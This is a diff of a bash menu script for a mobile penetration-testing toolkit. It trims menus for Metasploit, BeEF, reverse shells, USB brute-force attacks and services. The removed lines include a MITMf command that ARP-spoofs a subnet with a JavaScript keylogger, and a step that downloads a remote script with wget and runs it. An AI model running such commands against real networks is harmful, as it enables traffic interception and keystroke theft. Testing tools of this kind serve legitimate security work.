@@ -392,11 +392,10 @@ if [ ! -d "/var/lib/openvas/" ]; then
 	echo "Openvas is not currently installed.  The installation can take a few hours."
 	read -p "Would you like to install OpenVas (1GB+ space needed)? (y/n): " installopenvas
 		if [ "$installopenvas" == "y" ]; then
-			apt-get update && apt-get install -y openvas
-			openvas-setup && openvas-scapdata-sync && openvas-certdata-sync && openvas-check-setup && openvas-stop
-			openvasmd --create-user=admin --role=Admin
-			read -p "Enter OpenVas admin user password: " openvas_pass
-			openvasmd --user=admin --new-password="$openvas_pass"
+			apt-get update
+			apt-get dist-upgrade
+			apt-get install -y openvas
+			openvas-setup
 		fi
 fi
 clear
@@ -429,7 +428,6 @@ echo ""
 echo "[1]	Metasploit"
 echo "[2]	Beef-XSS"
 echo "[3]	Social-Engineering Toolkit"
-echo "[4]	MITMf - Man-In-The-Middle attacks"
 echo ""
 echo "[0]	Exit to main menu"
 echo ""
@@ -445,36 +443,6 @@ case $webchoice in
 esac
 }
 
-f_mitmf(){
-# Will develop a better way to interface with mitmf in the future
-clear
-read -p "Enter Interface: " -e -i "wlan0" mitmf_interface
-read -p "Enter Gateway IP: " -e -i "192.168.1.1" mitmf_routerip
-read -p "Enter Target IP: " -e -i "192.168.1.0/24" mitmf_targetip
-if ps ax | grep -v grep | grep beef-xss > /dev/null
-	then
-		echo "Beef-xss is running.  Will load autobeef..."
-		mitmf_startbeef=--beefauto
-		sleep 3
-	else
-		echo "Beef-xss is not running.  Would you like to start? (y/n) " mitmf_beefstart
-		if 	[ "$mitmf_beefstart" == "y" ]; then
-			echo "Starting beef-xss..."
-			service beef-xss start
-			mitmf_startbeef=--beefauto
-			sleep 5
-		else
-			mitmf_startbeef=""
-		fi
-fi
-cd /opt/MITMf
-echo "Logs saved to /captures/sslstrip/mitmf.log"
-echo ""
-echo "[*] ------------------------------------------------------"
-# Uncomment when beef-xss for MITMf is fixed #
-#python mitmf.py --spoof --arp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip $mitmf_startbeef --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
-python mitmf.py --spoof --arp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
-}
 ########################## REVERSE MENU ################################
 f_reverse(){
 echo "				REVERSE SHELLS"
@@ -632,38 +600,27 @@ clear
 echo "				SERVICES"
 echo ""
 echo ""
-echo "[1] Start SSH Server"
-echo "[2] Stop SSH Server"
+echo "[1] Start VNC Server"
+echo "[2] Stop VNC Server"
 echo ""
-echo "[3] Start VNC Server"
-echo "[4] Stop VNC Server"
+echo "[3] Start OpenVPN Server"
+echo "[4] Stop OpenVPN Server"
 echo ""
-echo "[5] Start OpenVPN Server"
-echo "[6] Stop OpenVPN Server"
-echo ""
-echo "[7] Start XServer on localhost (Android Applicaiton XServer XSDL)"
+echo "[5] Start XServer on localhost (Android Applicaiton XServer XSDL)"
 echo ""
 echo "[0] Exit to main menu"
 echo ""
 read -p "Choice: " serviceschoice
 
 case $serviceschoice in
-1) clear; f_ssh ;;
-2) clear; service ssh stop ;;
-3) clear; f_vncstart ;;
-4) clear; f_vnckill ;;
-5) clear; f_startvpn ;;
-6) clear; service openvpn stop ; iptables -F ; iptables -X ; echo "Stopping Openvpn" ;;
-7) clear; DISPLAY=127.0.0.1:0.0 startxfce4; echo "Server started on localhost to be used with Xserver XSDL application" ;;
+1) clear; f_vncstart ;;
+2) clear; f_vnckill ;;
+3) clear; f_startvpn ;;
+4) clear; service openvpn stop ; iptables -F ; iptables -X ; echo "Stopping Openvpn" ;;
+5) clear; DISPLAY=127.0.0.1:0.0 startxfce4; echo "Server started on localhost to be used with Xserver XSDL application" ;;
 0) f_interface ;;
 *) echo "Incorrect choice..." ;
 esac
-}
-
-f_ssh(){
-	service ssh start
-	echo "Starting SSHD"
-	sleep 3
 }
 
 f_vncstart(){
@@ -984,7 +941,6 @@ clear
 echo "				USB ATTACKS MENU"
 echo ""
 echo "[1] Dictionary based brute force attack"
-echo "[2] deADBolt"
 echo ""
 echo "[0] Exit to main menu"
 echo ""
@@ -992,7 +948,6 @@ read -p "Choice:" usbchoice
 
 case $usbchoice in
 1) clear; f_hid_dic;;
-2) clear; f_deadbolt;;
 0) f_interface;;
 *) f_hid ;;
 esac
@@ -1015,12 +970,6 @@ case $dictselect in
 	0) clear; f_usb;;
 	*) clear; f_hid_dic;;
 esac
-}
-
-f_deadbolt(){
-  clear
-  sh /usr/bin/deadbolt.sh
-  f_usb
 }
 
 ########################## NFC MENU ###############################
@@ -1207,9 +1156,7 @@ clear
 echo "				SETTINGS"
 echo ""
 echo "[1] Configure Timezone"
-echo "[2] Create Metasploit User and Database"
-echo "[3] Macchanger"
-echo "[4] Install NodeJS"
+echo "[2] Macchanger"
 echo ""
 echo "[0] Exit to main menu"
 echo ""
@@ -1217,45 +1164,10 @@ read -p "Choice:" settingschoice
 
 case $settingschoice in
 1) clear; dpkg-reconfigure tzdata ;;
-2) clear; f_msuser ;;
-3) clear; f_macchanger ;;
-4) clear; f_nodejs ;;
+2) clear; f_macchanger ;;
 0) f_interface ;;
 *) echo "Incorrect choice..." ;
 esac
-}
-
-f_nodejs(){
-clear
-cd /tmp
-wget https://gist.githubusercontent.com/binkybear/40bd757e47a1649f6732/raw/8fe5b74734d424d74a8e94589faff884a8f5ae58/nodejs_kali_install.sh
-chmod +x nodejs_kali_install.sh
-./nodejs_kali_install.sh
-rm -rf /tmp/nodejs_kali_install.sh
-echo "[+] NodeJS install completed"
-echo ""
-echo "Suggested application: localtunnel.me"
-echo "npm install -g localtunnel"
-echo "example: lt --port 8000 "
-echo "Will proxy port 8000 over https to world"
-sleep 5
-f_settings
-}
-
-f_msuser() {
-	service postgresql start
-	echo "Switching to user postgres"
-	su postgres
-	read -p "Enter Metasploit database username:" msuser
-	createuser -D -P -R -S $msuser
-	read -p "Enter Metasploit database name:" dbname
-	createdb --owner=$msuser $dbname
-	su root
-	echo "You can now add database connection to startup at ~/.msf4/msfconsole.rc"
-	echo "Add:"
-	echo "db_connect $msuser:YOURPASSWORD@127.0.0.1:5432/$dbname"
-	sleep 4
-	f_settings
 }
 
 f_macchanger(){
